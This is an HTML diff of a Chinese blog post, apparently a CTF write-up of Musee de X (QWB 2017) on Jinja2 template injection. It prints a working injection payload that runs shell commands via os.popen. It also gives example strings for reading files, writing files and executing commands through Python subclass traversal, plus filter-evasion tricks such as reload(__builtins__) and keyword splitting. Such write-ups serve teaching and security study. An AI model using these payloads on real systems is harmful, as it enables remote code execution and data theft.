@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Damn World</title>
+    <title>由Musee de X(强网杯2017)到jinja2模板注入 · Damn World</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
         
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -191,12 +193,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >damn guys</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">由Musee de X(强网杯2017)到jinja2模板注入</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>damn guys</a>
 </header>
@@ -210,24 +223,67 @@
 
 
 
+height:50vh;
+
 >
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/page.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            由Musee de X(强网杯2017)到jinja2模板注入
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/09/11</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
         
     </div>
 </div>
@@ -331,93 +387,106 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Musee-de-X-强网杯2017"><a href="#Musee-de-X-强网杯2017" class="headerlink" title="Musee de X(强网杯2017)"></a>Musee de X(强网杯2017)</h1><p><strong>学到新姿势</strong></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注册admin之后进行登录，然后有一个捐赠页面，，网址随便填，这里有一点要注意，名字必须和登录名一致，否则会弹出：<strong>screw you hacker</strong></p>
+<p>然后就成功的报错,查看报错信息:<br>在<strong>/var/www/html/museum/view.py in makememe</strong>中有以下错误：</p>
+<pre><code>if &quot;http://&quot; in url:
+image = urllib2.urlopen(url)
+  else:
+    url = &quot;http://&quot;+url
+image = urllib2.urlopen(url)
+except:
+  return HttpResponse(&quot;Error: couldn&apos;t get to that URL: &quot; + url + BACK)
+if int(image.headers[&quot;Content-Length&quot;]) &gt; 1024*1024: ...
+  return HttpResponse(&quot;File too large&quot;)
+fn = get_next_file(username)
+open(fn,&quot;w&quot;).write(image.read())
+text = jinja2.Template(text).render()
+print text
+add_text(fn,imghdr.what(fn),text)
+</code></pre><p>可知用用了jinja2模板<br>而在<strong>local vars</strong>中<strong>text</strong>行：</p>
+<blockquote>
+<p>text：u’admin’</p>
+</blockquote>
+<p>可以知道将用户名当作文本信息发送，那么这里就存在注入点</p>
+<h2 id="关于模板注入"><a href="#关于模板注入" class="headerlink" title="关于模板注入"></a>关于模板注入</h2><p>重点要关注的是Template，官方教程给出如下说明：</p>
+<pre><code>`{% ... %}` for Statements
+`{{ ... }}` for Expressions to print to the template output
+`` for Comments not included in the template output
+`#  ... ##` for Line Statements
+</code></pre><p>jinja2模板能访问一些python内置变量，如[],{}等，并且能够使用Python变量类型中的一些函数，这里要说明的一点是，如果要在jinja2中执行python代码，则要在模板环境中注册函数才能在模板中进行调用，具体可参考这篇文章：<br><a href="http://www.freebuf.com/articles/system/97146.html" target="_blank" rel="noopener">利用 Python 特性在 Jinja2 模板中执行任意代码</a></p>
+<p>于是给出payload：</p>
+<pre><code>abc{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
+</code></pre><p>要说明的一点是因为网址信息要求是一张图片，所以需要给出图片地址，例：<a href="http://pic.58pic.com/58pic/17/28/21/24d58PICqnU_1024.jpg" target="_blank" rel="noopener">http://pic.58pic.com/58pic/17/28/21/24d58PICqnU_1024.jpg</a></p>
+<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="builtins模块"><a href="#builtins模块" class="headerlink" title="builtins模块"></a><strong>builtins</strong>模块</h3><p>builtins模块是python中的一个内建模块，如图：<br><img src="https://i.imgur.com/HoztRez.png" alt=""><br>该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存。另外，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀。<strong>但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即dict字典属性)中添加该功能。</strong></p>
+<h3 id="class-base-subclasses"><a href="#class-base-subclasses" class="headerlink" title="().class.base.subclasses()"></a>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()</h3><p><img src="https://i.imgur.com/4D9ci7V.png" alt=""><br>为什么可以访问到所有模块呢？<br>当我们输入<code>().__class__</code>时，python显示为一个<strong>tuple</strong>类型，于是继续输入<code>().__class__.__base__</code>,访问类库，python显示为<strong>object</strong>类型，我们再继续访问，输入<code>().__class__.__base__.__subclasses__()</code>便得到了object的所有子类。于是接下来我们就可以访问对应的子类，由此便可能引发安全问题，例如<strong>file</strong>可以读取任意文件<br>除此之外还要提到的是，输入<code>().__class__.__mro__[1].__subclasses__()</code>也可以访问object的所有子类，这里要注意的是mro(Method Resolution Order)，关于多继承的问题，不再赘述</p>
+<p>示例利用代码：</p>
+<pre><code>//读文件
+().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read() 
+//写文件
+().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;) 
+//执行任意命令
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )
+</code></pre><p>制作沙盒环境时，可能往往会删掉一些危险函数</p>
+<pre><code>del __builtins__.__dict__[&apos;__import__&apos;] # __import__ is the function called by the import statement
+del __builtins__.__dict__[&apos;eval&apos;] # evaluating code could be dangerous
+del __builtins__.__dict__[&apos;execfile&apos;] # likewise for executing the contents of a file
+del __builtins__.__dict__[&apos;input&apos;] # Getting user input and evaluating it might be dangerous
+</code></pre><p>然而我们可以通过reload方法进行重载<br> <code>reload(__builtins__)</code></p>
+<p>还有一些情况是，程序员会进行一些关键词过滤，于是有几种思路是：</p>
+<ol>
+<li>利用python的base64等模块进行加密操作，然后再代码利用再进行一次解密操作<blockquote>
+<pre><code>&gt;&gt;import base64
+&gt;&gt;base64.b64encode(&apos;__import__&apos;)
+&apos;X19pbXBvcnRfXw==&apos;
+&gt;&gt;base64.b64encode(&apos;os&apos;)
+&apos;b3M=&apos; 
+</code></pre></blockquote>
+</li>
+<li><p>拼接字符串</p>
+<p> [x for x in [].class.base.subclasses() if x.name == ‘catch_warnings’][0].init.func_globals[‘linecache’].dict[‘o’+’s’].dict<a href="&#39;echo Hello SandBox&#39;">‘sy’+’stem’</a></p>
+</li>
+</ol>
+
+    </article>
+    <!-- license  -->
     
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2017/12/31/随笔/Create/" >
-                
-                    <span>To2018</span>
-            </a>
-            <div class="abstract-content">
-                发生了太多，经历了太多，承受了太多，感觉一切都像是在hell，但又真真切切的存在于我的记忆中。你还好吗？愿你安好，天堂没有病痛，只有快乐。所以，让我来替你经历吧。不在颓废了，我想留学了，至少我想去一个更好的地方。总是在渴望着所谓的恋爱，但是恋爱不是全部呢，所以别被她所羁绊吧。
-
-To be a engineer
-
-
-To be a hacker
-
-
-To be a excellent man
-
-
-To be the best
-
-
-To Sillcon Valley
-
-
-To London
-
-
-To all over the world
-
-
-To be rich
-
-
-To concert
-...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/31</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "心绪">心绪</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2017/12/04/随笔/无比芜杂的心绪/" >
-                
-                    <span>无比芜杂的心绪</span>
-            </a>
-            <div class="abstract-content">
-                —20:00
-最近突然迷上了太宰治，《人间失格》中近乎颓丧的笔调让我感觉近乎阴郁，但“叶藏”却仿佛让我看到了另一个自己，但尚不及他。
-字里行间无不显露着一股忧郁混乱的之感，“叶藏”的一生倒也不尽悲哀。每一个喜剧家其实都是一个悲观主义者，我想这句话也是他的人生写照。每一个由“叶藏”所制造的喜剧却仿佛与他毫无关联，似乎此时此刻，他由一个剧作家变为了观众，谈不上欣赏，只是默默观看。“床头金尽，情缘两断”，看似戏谑，可是真的如此吗？
-他有时是一个人，烟酒，妓女，金钱，也都一一尝尽；有时却与人遥隔两端，他是没有归属感的，“好子”的被侵犯，愤怒似乎从来没出现过在他身上，对死也无所畏惧。
-其实也很悲哀...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "随笔">随笔</a>
-    
-</div>
-                
-            </div>
-        </article>
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://microvorld.com">damn1t</a>
+            <p>原文链接: <a href="http://microvorld.com/2018/09/11/CTF/jinja2/">http://microvorld.com/2018/09/11/CTF/jinja2/</a>
+            <p>发表日期: <a href="http://microvorld.com/2018/09/11/CTF/jinja2/">September 11th 2018, 3:03:37</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/09/08/pwn/pwnable1/" title= pwnable.kr(1-2) >
+                    <div class="prevTitle">pwnable.kr(1-2)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -487,6 +556,24 @@ To concert
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Musee-de-X-强网杯2017"><span class="toc-number">1.</span> <span class="toc-text">Musee de X(强网杯2017)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于模板注入"><span class="toc-number">1.2.</span> <span class="toc-text">关于模板注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重点"><span class="toc-number">1.3.</span> <span class="toc-text">重点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins模块"><span class="toc-number">1.3.1.</span> <span class="toc-text">builtins模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#class-base-subclasses"><span class="toc-number">1.3.2.</span> <span class="toc-text">().class.base.subclasses()</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -867,6 +954,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
     
     </body>
 </html>
